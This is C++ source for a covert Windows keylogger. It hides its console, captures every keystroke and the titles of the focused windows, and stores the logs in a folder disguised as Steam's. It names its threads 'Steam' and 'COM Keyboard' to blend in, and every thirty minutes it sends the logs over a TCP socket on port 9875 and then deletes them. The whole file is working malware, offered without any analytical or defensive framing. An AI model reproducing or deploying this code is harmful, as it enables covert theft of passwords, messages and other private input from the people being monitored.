#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <fstream>
#include <iostream>
#include <ctime>
#include <pthread.h>

#pragma comment(lib, "Ws2_32.lib")

std::string logFile = "C:/Users/Public/Documents/Steam/COM_log.bin";
std::string logFileSending = "C:/Users/Public/Documents/Steam/COM_log_sending.bin";
std::string logFileError = "C:/Users/Public/Documents/Steam/COM_log_error.txt";
//std::string logFile = "test.txt";

bool SpecialKeys(int spKey);
void SaveToFile(tm *time, std::string titleTmp, std::string logFileType = logFile);
void LogIntoFile(std::string input, bool timeStamp = false, std::string logFileType = logFile);

std::string GetAWinTitle() //GETS FOCUSED'S WINDOW TITLE
{
    char win_title[256];
    GetWindowText(GetForegroundWindow(),win_title,sizeof(win_title));
    return win_title;
}

void Stealth() //HIDES CONSOLE
{
    HWND Stealth;
    AllocConsole();
    Stealth = GetConsoleWindow();
    ShowWindow(Stealth,0);
}

void SaveToFile(tm *time, std::string titleTmp, std::string logFileType) //SAVES INFO ABOUT FOCUSED WINDOW IN SPECIFIC FORMAT
{
    std::ofstream logFileS;
    logFileS.open(logFileType, std::ios_base::app);
    logFileS << "}$\n" << "[" << time->tm_mday << "/" << 1 + time->tm_mon << "/" << 1900 + time->tm_year << " - " << time->tm_hour << ":" << time->tm_min << ":" << time->tm_sec << "] " << titleTmp << " - ${";
    logFileS.close();
}

void LogIntoFile(std::string input, bool timeStamp, std::string logFileType) //BASIC LOG FUNCTION
{
    std::ofstream logFileS;
    logFileS.open(logFileType, std::ios_base::app);
    if(timeStamp)
    {
        time_t timeNow = time(0);
        tm *time = localtime(&timeNow);
        logFileS << "\n" << "[" << time->tm_mday << "/" << 1 + time->tm_mon << "/" << 1900 + time->tm_year << " - " << time->tm_hour << ":" << time->tm_min << ":" << time->tm_sec << "] " << input;
    }
    else
    {
        logFileS << input;
    }
    logFileS.close();
}

void *SpoofKeyBoard(void *threadID) //FUNCTION FOR KEYLOGGING
{
    pthread_setname_np(pthread_self(), "COM Keyboard");
    while(1)
    {
        Sleep(10);
        for (int KEY = 8; KEY <= 190; KEY++)
        {
            if (GetAsyncKeyState(KEY) == -32767) 
            {
                if (SpecialKeys(KEY) == false) 
                {
                    std::fstream logFileS;
                    logFileS.open(logFile, std::fstream::app);
                    if (logFileS.is_open()) 
                    {
                        logFileS << char(KEY);
                        logFileS.close();
                    }

                }
            }
        }
    }
}

void *SpoofActiveWindow(void *threadID) //FUNCTION FOR WINDOW NAME LOGGING
{
    pthread_setname_np(pthread_self(), "Steam");
    time_t timeNow = time(0);
    std::string titleTmp = "START";
    while(1)
    {
        std::string title = GetAWinTitle();
        if(titleTmp != title && !title.empty())
        {
            timeNow = time(0);
            tm *time = localtime(&timeNow);
            titleTmp = title;
            SaveToFile(time,titleTmp);
            Sleep(200);
        }
        else
        {
            Sleep(1000);
        }
    }
}

void *Socket(void *threadID)
{
    Sleep(1800000); //Delay so keylogger has data to send
    WSADATA wsaData;
    SOCKET sendingSocket;
    SOCKADDR_IN ServerAddr;
    unsigned int Port = 9875;
    int  RetCode;
    int BytesSent, nlen;
    char tempBuff[1024];
    while(1)
    {
        WSAStartup(MAKEWORD(2,2), &wsaData);
        printf("Client: Winsock DLL status is %s.\n", wsaData.szSystemStatus);
        sendingSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sendingSocket == INVALID_SOCKET)
        {
            LogIntoFile("Client: socket() failed! Error code: " + WSAGetLastError(),true,logFileError);
            WSACleanup();
            Sleep(100);
            continue;
        }
        else
        {
            printf("Client: socket() is OK!\n");
        }
        ServerAddr.sin_family = AF_INET;
        ServerAddr.sin_port = htons(Port);
        ServerAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
        RetCode = connect(sendingSocket, (SOCKADDR *) &ServerAddr, sizeof(ServerAddr));
        if(RetCode != 0)
        {
            LogIntoFile("Client: connect() failed! Error code: " + WSAGetLastError(),true,logFileError);
            closesocket(sendingSocket);
            WSACleanup();
            Sleep(1800000);
            continue;
        }
        else
        {
            //printf("Client: connect() is OK, got connected...\n");
            //printf("Client: Ready for sending and/or receiving data...\n");
        }
        std::ifstream logFileS;
        rename("C:/Users/Public/Documents/Steam/COM_log.bin","C:/Users/Public/Documents/Steam/COM_log_sending.bin");
        //printf("Opening file!");
        logFileS.open("C:/Users/Public/Documents/Steam/COM_log_sending.bin",std::ios::binary);
        //printf("File open!");
        while(1)
        {
            if(logFileS.getline(tempBuff,1024) && BytesSent != SOCKET_ERROR)
            {
                BytesSent = send(sendingSocket, tempBuff, strlen(tempBuff), 0);
                //LogIntoFile("Client: Sending data!",true,logFile_Debug);
                //printf("Sending data : %s",tempBuff);
                Sleep(50);
                memset(tempBuff, 0, sizeof tempBuff);
                Sleep(10);
            }
            else if(BytesSent == SOCKET_ERROR)
            {
                LogIntoFile("Client: send() failed! Error code: " + WSAGetLastError(),true,logFileError);
                break;
            }
            else
            {
                break;
            }
        }
        Sleep(10000);
        logFileS.close();
        Sleep(10000);
        if(remove("C:/Users/Public/Documents/Steam/COM_log_sending.bin") != 0)
        {
            LogIntoFile("File couldn't be removed!",true,logFileError);
        }
        //printf("File closed!\n");
        if(BytesSent == SOCKET_ERROR)
        {
            LogIntoFile("Client: send() failed! Error code: " + WSAGetLastError(),true,logFileError);
            closesocket(sendingSocket);
            WSACleanup();
            Sleep(1000);
            continue;
        }
        else
        {
            //LogIntoFile("Client: send() succesfull!",true,logFile_Debug);
            closesocket(sendingSocket);
            WSACleanup();
            Sleep(1800000);
            continue;
        }
    }
    //--------------------------------------------------------
}

int main(int argc, char const *argv[])
{
    pthread_t threads[3];
    Stealth();
    int rc;
    std::ofstream logFileS;

    logFileS.open(logFile, std::ios_base::app);
    LogIntoFile("SYSTEM STARTUP!",true);
    logFileS.close();

    rc = pthread_create (&threads[0],NULL,SpoofActiveWindow,(void *)0);
    if(rc)
    {
        LogIntoFile("FAILED TO CREATE THREAD 0 (Window)!",true,logFileError);
        exit(-1);
    }
    rc = pthread_create (&threads[1],NULL,SpoofKeyBoard,(void *)1);
    if(rc)
    {
        LogIntoFile("FAILED TO CREATE THREAD 1 (KeyBoard)!",true,logFileError);
        exit(-1);
    }
    rc = pthread_create (&threads[2],NULL,Socket,(void *)2);
    if(rc)
    {
        LogIntoFile("FAILED TO CREATE THREAD 2 (Socket)!",true,logFileError);
        exit(-1);
    }
    LogIntoFile("All threads started!",true);
    pthread_exit(NULL);
}

//--------------------------------------------------------------
//---------------------LIST OF SPECIAL KEYS---------------------
//--------------------------------------------------------------

bool SpecialKeys(int spKey) 
{
	switch (spKey) {
	case VK_SPACE:
		LogIntoFile(" ");
		return true;
	case VK_RETURN:
		LogIntoFile("[ENTER]");
		return true;
	case VK_SHIFT:
		LogIntoFile("[SHIFT]");
		return true;
	case VK_BACK:
		LogIntoFile("[BACKSPACE]");
		return true;
	case VK_CONTROL:
		LogIntoFile("[CTRL]");
		return true;
    case VK_TAB:
        LogIntoFile("[TAB]");
		return true;
    case VK_MENU:
        LogIntoFile("[ALT]");
		return true;
    case VK_CAPITAL:
        LogIntoFile("[CAPS]");
		return true;
    case VK_ESCAPE:
        LogIntoFile("[ESC]");
		return true;
    case 0x31:
        LogIntoFile("+");
		return true;
    case 0x32:
        LogIntoFile("ě");
		return true;
    case 0x33:
        LogIntoFile("š");
		return true;
    case 0x34:
        LogIntoFile("č");
		return true;
    case 0x35:
        LogIntoFile("ř");
		return true;
    case 0x36:
        LogIntoFile("ž");
		return true;
    case 0x37:
        LogIntoFile("ý");
		return true;
    case 0x38:
        LogIntoFile("á");
		return true;
    case 0x39:
        LogIntoFile("í");
		return true;
    case 0x30:
        LogIntoFile("é");
		return true;
    case VK_NUMPAD0:
        LogIntoFile("0");
		return true;
    case VK_NUMPAD1:
        LogIntoFile("1");
		return true;
    case VK_NUMPAD2:
        LogIntoFile("2");
		return true;
    case VK_NUMPAD3:
        LogIntoFile("3");
		return true;
    case VK_NUMPAD4:
        LogIntoFile("4");
		return true;
    case VK_NUMPAD5:
        LogIntoFile("5");
		return true;
    case VK_NUMPAD6:
        LogIntoFile("6");
		return true;
    case VK_NUMPAD7:
        LogIntoFile("7");
		return true;
    case VK_NUMPAD8:
        LogIntoFile("8");
		return true;
    case VK_NUMPAD9:
        LogIntoFile("9");
		return true;
    case VK_MULTIPLY:
        LogIntoFile("*");
		return true;
    case VK_ADD:
        LogIntoFile("+");
		return true;
    case VK_DIVIDE:
        LogIntoFile("/");
		return true;
    case VK_SUBTRACT:
        LogIntoFile("-");
		return true;
    case VK_OEM_1:
        LogIntoFile("ů");
		return true;
    case VK_OEM_COMMA:
        LogIntoFile(",");
		return true;
    case VK_OEM_PERIOD:
        LogIntoFile(".");
		return true;
    case VK_OEM_MINUS:
        LogIntoFile("_");
		return true;
    case VK_OEM_4:
        LogIntoFile("ú");
		return true;
    case VK_OEM_6:
        LogIntoFile(")");
		return true;
	default: 
		return false;
	}
}